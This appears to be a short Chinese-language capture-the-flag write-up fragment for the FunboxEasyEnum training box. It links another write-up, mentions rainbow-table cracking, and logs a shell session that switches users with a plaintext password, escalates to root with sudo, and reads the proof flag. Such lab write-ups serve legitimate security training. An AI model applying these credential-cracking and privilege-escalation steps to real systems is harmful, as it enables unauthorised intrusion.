参考资料  
文档复现
 
解题思路2：  
[https://medium.com/@aslam.mahimkar/oscp-proving-ground-play-funboxeasyenum-writeup-edf5a9cbfed4](https://medium.com/@aslam.mahimkar/oscp-proving-ground-play-funboxeasyenum-writeup-edf5a9cbfed4)
      

彩虹表进行爆破和hash碰撞
       
记录文件  
oracle@funbox7:/var/www$ cd /home  
cd /home  
oracle@funbox7:/home$ ls  
ls  
goat harry karla oracle sally  
oracle@funbox7:/home$ su karla  
su karla  
Password: tgbzhnujm!
 
To run a command as administrator (user "root"), use "sudo \<command\>".  
See "man sudo_root" for details.
 
karla@funbox7:/home$ sudo su  
sudo su  
[sudo] password for karla: tgbzhnujm!
 
root@funbox7:/home#
 
root@funbox7:/home# ls  
ls  
goat harry karla oracle sally  
root@funbox7:/home# cd  
cd  
root@funbox7:~# ls  
ls  
proof.txt root.flag  
root@funbox7:~# cat root.flag  
cat root.flag  
Your flag is in another file...  
root@funbox7:~# cat proof.txt  
cat proof.txt  
2098a9206da7c1a7242c1fcf26fa805f  
root@funbox7:~#